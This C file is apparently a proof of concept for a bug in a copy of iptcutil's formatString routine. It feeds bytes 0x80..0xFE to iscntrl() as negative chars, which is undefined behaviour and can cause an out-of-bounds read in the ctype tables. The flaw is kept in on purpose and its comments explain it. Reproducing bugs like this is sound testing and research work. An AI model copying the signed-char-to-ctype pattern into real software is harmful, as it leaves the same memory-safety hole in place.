#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <locale.h>
#include <limits.h>

/*
 * Minimal copy of the vulnerable routine from contrib/iptcutil/iptcutil.c
 * Only the parts needed to trigger the bug are included.
 */
static void formatString(FILE *ofile, const char *s, int len)
{
    putc('"', ofile);
    for (; len > 0; --len, ++s)
    {
        int c = *s; /* possibly negative when char is signed and *s >= 0x80 */
        switch (c)
        {
            case '&':
                fputs("&amp;", ofile);
                break;
            /* HANDLE_GT_LT intentionally not defined to match typical build */
            case '"':
                fputs("&quot;", ofile);
                break;
            default:
                /* BUG: calling iscntrl with a potentially negative value (not EOF) */
                if (iscntrl(c))
                    fprintf(ofile, "#%d;", c);
                else
                    putc(*s, ofile);
                break;
        }
    }
    fputs("\"\n", ofile);
}

int main(void)
{
    /* Use the C locale; the UB is independent of locale, but this mirrors common setups */
    setlocale(LC_ALL, "C");

    /*
     * Build a buffer containing bytes 0x80..0xFE. On platforms where 'char' is signed
     * (e.g., x86_64 Linux by default), these become negative when promoted to int,
     * which is then passed to iscntrl(), triggering the undefined behavior that can
     * cause an out-of-bounds read in the ctype tables.
     */
    unsigned char ubytes[127];
    for (int i = 0; i < 127; i++) {
        ubytes[i] = (unsigned char)(0x80 + i); /* 0x80..0xFE (avoid 0xFF == EOF) */
    }

    /* Cast to const char* so formatString reads with 'char' signedness of this platform */
    const char *payload = (const char *)ubytes;

    /* Informative note if this platform uses unsigned char by default */
    if ((char)0x80 > 0) {
        fprintf(stderr, "Note: 'char' appears unsigned on this platform; the UB may not trigger.\n");
    }

    /* Call the vulnerable function: this will pass negative values to iscntrl() */
    formatString(stdout, payload, (int)sizeof(ubytes));

    /* Ensure all I/O is flushed */
    fflush(stdout);

    return 0;
}
